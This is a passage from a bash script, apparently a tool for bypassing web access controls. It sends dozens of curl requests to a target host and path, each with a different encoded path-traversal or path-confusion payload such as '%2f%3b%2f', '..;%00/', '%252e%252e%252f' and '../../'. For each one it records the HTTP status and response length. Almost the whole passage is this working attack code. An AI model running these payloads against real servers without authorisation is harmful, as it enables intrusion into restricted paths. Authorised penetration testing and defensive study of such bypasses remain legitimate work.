echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%23$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%09$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%09$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f..$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e%2e/..%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e%2e/..%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2f%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/..$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b//%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b//%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b//%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%23$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%3f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ .. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%00/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT;" -H "$user_agent")
print
echo -n "Payload [ ..%00;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%09$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%5c/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff/;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%00/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%00/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%00/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%0d/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%0d/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%0d/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%ff/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%ff/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%ff/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\\$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\\$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;\; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..\; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\;$PAT" -H "$user_agent")
print
echo -n "Payload [ /%20# ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT#" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT#" -H "$user_agent")
print
echo -n "Payload [ /%20%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20%23$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20%23$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%252f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%253b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%253b/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%253b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%253b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%253b/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%253b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252f$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e%3b/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b//$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e//$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%3b/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..//../ ]:"
